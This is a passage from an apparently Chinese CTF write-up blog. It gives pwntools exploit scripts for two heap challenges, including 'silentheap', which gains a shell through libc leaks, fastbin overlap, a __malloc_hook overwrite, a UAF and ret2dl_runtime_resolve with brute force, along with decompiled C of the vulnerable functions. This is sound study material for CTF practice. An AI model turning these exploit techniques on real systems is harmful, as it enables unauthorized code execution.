class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"name:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">1</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">8</span>)<span class="comment">#2</span></span><br><span class="line">    Show(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">' : aaaaaaaa'</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">6</span>).strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - (<span class="number">0x00007fa9b0771c78</span><span class="number">-0x7fa9b03ad000</span>)</span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    <span class="comment">#3 &amp; 4 &amp; 5</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">3</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x18</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5 border</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x50</span>,<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x20</span>))<span class="comment">#3</span></span><br><span class="line">    <span class="comment">#chunk shrink</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)<span class="comment">#1 &amp; 2 &amp; 3 &amp; 4</span></span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">1</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">3</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#Delete(3)</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)<span class="comment">#1 &amp; 2 &amp; 3 &amp; 4</span></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>*<span class="number">0x800</span>)<span class="comment">#1 &amp; 2 &amp; 3 &amp; 4</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#overlap chunk3</span></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">1</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">2</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0 == 3</span></span><br><span class="line">    <span class="comment">#double free</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="number">5</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Delete(<span class="number">0</span>)</span><br><span class="line">    Delete(<span class="number">4</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    main_arena = libc_base + (<span class="number">0x7fa9b0771b20</span><span class="number">-0x7fa9b03ad000</span>)</span><br><span class="line">    fake_chunk = main_arena+<span class="number">0xd</span></span><br><span class="line">    fake_top = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x25</span></span><br><span class="line">    <span class="comment">#fake_top = libc_base + libc.symbols['__free_hook']-0x17</span></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]<span class="comment">#0 2 tried</span></span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    realloc_addr = libc_base + libc.symbols[<span class="string">'realloc'</span>]</span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">0</span>,p64(fake_chunk))<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">4</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">0</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x48</span>,<span class="number">3</span>,<span class="string">'\x00'</span>*<span class="number">0x3b</span>+p64(fake_top))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x58</span>,<span class="number">0</span>,<span class="string">'\x00'</span>*(<span class="number">5</span>+<span class="number">0x8</span>)+p64(shell_addr)+p64(realloc_addr+<span class="number">0xe</span>))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#Add(0x58,0,'\x00'*7+p64(system_addr))#0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#Add(0x38,0,'\x00'*7+p64(system_addr))#0</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size : "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">17</span>))</span><br><span class="line">    p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">    p.sendline(str(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#Add(0x10,1,'/bin/sh\x00')</span></span><br><span class="line">    <span class="comment">#Delete(1)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="silentheap"><a href="#silentheap" class="headerlink" title="silentheap"></a>silentheap</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这题花的时间最久，最后也不算完全搞好，看了长亭的Exp和另一个大佬的思路，留在这里记录一下。</p>
<h3 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h3><p>程序有几个功能，Malloc1分配一个0x158的块，在0x154偏移处放了magic1函数地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *chunk_addr; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    chunk_addr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x158</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>(chunk_addr + <span class="number">4</span>, src);</span><br><span class="line">    *((_DWORD *)chunk_addr + <span class="number">0x55</span>) = magic1;    <span class="comment">// offset:0x154</span></span><br><span class="line">    ptr[i] = chunk_addr;</span><br><span class="line">    dword_804AA60[i] = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Malloc2分配一个0x358的堆块，0x354处放magic2函数地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Malloc2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v0; <span class="comment">// ST18_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; ptr[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x358</span>u);</span><br><span class="line">    <span class="built_in">strcpy</span>(v0 + <span class="number">4</span>, aThouWhoArtDark);</span><br><span class="line">    *((_DWORD *)v0 + <span class="number">0xD5</span>) = magic2;</span><br><span class="line">    ptr[i] = v0;</span><br><span class="line">    dword_804AA60[i] = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">magic1</span><span class="params">(<span class="keyword">int</span> chunk_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+0h] [ebp-158h]</span></span><br><span class="line"></span><br><span class="line">  get_input((<span class="keyword">int</span>)&amp;s1, <span class="number">0x150</span>);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(chunk_addr + <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = get_input(chunk_addr + <span class="number">4</span>, <span class="number">0x150</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">magic2</span><span class="params">(<span class="keyword">int</span> chunk_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s1; <span class="comment">// [esp+0h] [ebp-358h]</span></span><br><span class="line"></span><br><span class="line">  get_input((<span class="keyword">int</span>)&amp;s1, <span class="number">0x350</span>);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(&amp;s1, (<span class="keyword">const</span> <span class="keyword">char</span> *)(chunk_addr + <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = get_input(chunk_addr + <span class="number">4</span>, <span class="number">0x350</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Free函数从后往前覆盖，不会清空chunk_addr[idx]，但是会把chunk_size[idx]清零。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Free</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = read_int();</span><br><span class="line">  idx = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">int</span>)ptr[result];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      result = dword_804AA60[idx];</span><br><span class="line">      <span class="keyword">if</span> ( result )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">free</span>(ptr[idx]);</span><br><span class="line">        <span class="keyword">for</span> ( i = idx; i &lt;= <span class="number">8</span> &amp;&amp; ptr[i]; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          ptr[i] = ptr[i + <span class="number">1</span>];</span><br><span class="line">          dword_804AA60[i] = dword_804AA60[i + <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        result = i;</span><br><span class="line">        dword_804AA60[i] = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>CallFunc可以去调用堆里的magic函数，这里有UAF，UAF一个0x358的块，提前在里面构造好magic2的函数地址，之后可以任意地址执行。长亭的wp是ret到了0x08048690，调试之后发现ret过去相当于getinput栈地址，size为0x08..的一个极大数，这就造成了栈溢出，因为这里没有puts函数，栈迁移之后构造ret2_dl_runtime_resolve应该就可以了，但是调试发现不太行，这块有点迷，也懒得编译32位libc去看源码了，再看另一个师傅1mpossible的wp发现可以爆破，bss里放个binsh，之后爆破execv的地址，大概中间三字节是0xdxx或者0xexx，因此复杂度应该是256*2，本地跑了三分钟出的，个人感觉远程应该要10分钟以上。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level=&quot;DEBUG&quot;</span><br><span class="line">#s = remote(&apos;152.136.21.148&apos;,12047)</span><br><span class="line">context.terminal = [&apos;tmux&apos;,&apos;split&apos;,&apos;-h&apos;]</span><br><span class="line">elf = ELF(&apos;./silentheap&apos;)</span><br><span class="line">gadgets = [0x3d0d3,0x3d0d5,0x3d0d9,0x3d0e0,0x67a7f,0x67a80,0x137e5e,0x137e5f]</span><br><span class="line">def malloc_0(s):</span><br><span class="line">    s.sendline(&apos;1&apos;)</span><br><span class="line">def malloc_1(s):</span><br><span class="line">    s.sendline(&apos;2&apos;)</span><br><span class="line">def run(s,idx):</span><br><span class="line">    s.sendline(&apos;3&apos;)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line">def free(s,idx):</span><br><span class="line">    s.sendline(&apos;4&apos;)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line">def write_(s,idx):</span><br><span class="line">    s.sendline(&apos;5&apos;)</span><br><span class="line">    s.sendline(str(idx))</span><br><span class="line">def pwn(s):</span><br><span class="line">    p_ret = 0x0804841d</span><br><span class="line">    p2_ret = 0x08048aca</span><br><span class="line">    p3_ret = 0x08048ac9</span><br><span class="line">    p4_ret = 0x08048ac8</span><br><span class="line">    a1 = &quot;Darkness beyond twilight Crimson beyond blood that flows Buried in the stream of time is where your power grows I pledge myself to conquer all the foes who stand before the mighty gift bestowed in my unworthy hand Let the fools who stand before me be destroyed by the power you and I possess...&quot;</span><br><span class="line">    a2 = &quot;Thou who art darker than even darkness, Thou who art deeper than even the night! Thou, the Sea of Chaos, who drifts upon it, Golden Lord of Darkness! Hereby I call to thee, Hereby I swear before thee! Those who would stand against us, All those who are fools, By the power you and I possess, Grant destruction equally upon them all!&quot;</span><br><span class="line"></span><br><span class="line">    dynamic= 0x08049f14</span><br><span class="line">    strtab = 0x080482cc</span><br><span class="line">    symtab = 0x080481dc</span><br><span class="line">    rel_plt = 0x080483b4</span><br><span class="line">    write_(s,1)</span><br><span class="line">    #s.sendline(a1)</span><br><span class="line">    s.sendline(&apos;A&apos;*0x148)</span><br><span class="line">    write_(s,2)</span><br><span class="line">    #s.sendline(a2)</span><br><span class="line">    s.sendline(p32(0x08048690)*(0x348/4))</span><br><span class="line">    for i in range(10):</span><br><span class="line">        malloc_1(s)</span><br><span class="line">    free(s,9)</span><br><span class="line">    #gdb.attach(s,&apos;b* 0x080489ba&apos;)</span><br><span class="line"></span><br><span class="line">    #gdb.attach(s,&apos;b* 0x080489ba&apos;)</span><br><span class="line"></span><br><span class="line">    #gdb.attach(s,&apos;b* 0x08048694&apos;)</span><br><span class="line">    #gdb.attach(s,&apos;b* 0x80486ac&apos;)</span><br><span class="line">    run(s,9)</span><br><span class="line">    bss_1 = elf.bss()+0x100</span><br><span class="line">    log.success(&apos;bss1 addr =&gt; &apos; + hex(bss_1))</span><br><span class="line">    bss_2 = elf.bss()+0x200</span><br><span class="line">    read_plt = elf.plt[&apos;read&apos;]</span><br><span class="line">    resolve_plt = 0x08048420</span><br><span class="line">    leave_ret = 0x08048538</span><br><span class="line">    pay = &apos;A&apos;*0x12</span><br><span class="line">    pay += p32(bss_1)</span><br><span class="line">    pay += p32(read_plt) + p32(0x08048ac8) + p32(0) + p32(bss_1) + p32(0x100) + p32(bss_1) + p32(leave_ret)</span><br><span class="line">    s.sendline(pay)</span><br><span class="line">    #calc</span><br><span class="line">    free_got = elf.got[&apos;free&apos;]</span><br><span class="line">    fake_data_addr = bss_1 + 0x40</span><br><span class="line">    fake_rel_off = fake_data_addr - rel_plt</span><br><span class="line">    fake_sym_off = (fake_data_addr + 0x10 - symtab) / 0x10</span><br><span class="line">    log.info(&apos;fake sym off =&gt; &apos; + hex(fake_sym_off))</span><br><span class="line">    fake_str_off = (fake_data_addr+0xc+0x10-strtab)</span><br><span class="line">    binsh_addr = (fake_data_addr+0xc+0x10+0x7)</span><br><span class="line">    #set structs</span><br><span class="line">    fake_rel = p32(free_got) + p32((fake_sym_off&lt;&lt;8)+7)</span><br><span class="line">    fake_sym = p32(fake_str_off)+p32(0)*2+chr(0x12)+chr(0)+p16(0)</span><br><span class="line">    strings = &quot;system\x00/bin/sh\x00\x00&quot;</span><br><span class="line">    #</span><br><span class="line">    payload = p32(0) + p32(resolve_plt) + p32(fake_rel_off)+&quot;a&quot;*4+p32(binsh_addr)</span><br><span class="line">    payload = payload.ljust(0x3c,&apos;a&apos;)</span><br><span class="line">    payload += p32(binsh_addr)</span><br><span class="line">    payload += fake_rel + &apos;a&apos;*4 + fake_sym + strings</span><br><span class="line">    binsh_addr = 0x0804ab20+0x8</span><br><span class="line">    buf = p32(bss_1)+p32(p3_ret)+&quot;/bin/sh\x00&quot;+p32(bss_1)+p32(0xf7dea000+0xbf740)+p32(0x08048406)+p32(binsh_addr)+p32(0)*2</span><br><span class="line">    s.send(buf)</span><br><span class="line">    s.sendline(&quot;ls&quot;)</span><br><span class="line">    data = s.recv()</span><br><span class="line">    if data and &quot;smashing&quot; not in data:</span><br><span class="line">        s.interactive()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    while True:</span><br><span class="line">        s = process(&apos;./silentheap&apos;)</span><br><span class="line">        try:</span><br><span class="line">            pwn(s)</span><br><span class="line">        except Exception as e:</span><br><span class="line">            s.close()</span><br><span class="line">        finally:</span><br><span class="line">            s.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">CallFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  result = read_int();</span><br><span class="line">  v1 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> &amp;&amp; result &lt;= <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">int</span>)ptr[result];</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( dword_804AA60[v1] == <span class="number">2</span> )</span><br><span class="line">        result = (*((<span class="keyword">int</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1] + <span class="number">0xD5</span>))(ptr[v1]);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        result = (*((<span class="keyword">int</span> (__cdecl **)(<span class="keyword">void</span> *))ptr[v1] + <span class="number">0x55</span>))(ptr[v1]);<span class="comment">// else 包含0的情况</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:08048690                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:08048693                 push    eax</span><br><span class="line">.text:08048694                 call    get_input</span><br><span class="line">.text:08048699                 add     esp, 10h</span><br><span class="line">.text:0804869C                 sub     esp, 0Ch</span><br><span class="line">.text:0804869F                 lea     eax, [ebp+nptr]</span><br><span class="line">.text:080486A2                 push    eax             ; nptr</span><br><span class="line">.text:080486A3                 call    _atoi</span><br><span class="line">.text:080486A8                 add     esp, 10h</span><br><span class="line">.text:080486AB                 leave</span><br><span class="line">.text:080486AC                 retn</span><br></pre></td></tr></table></figure>
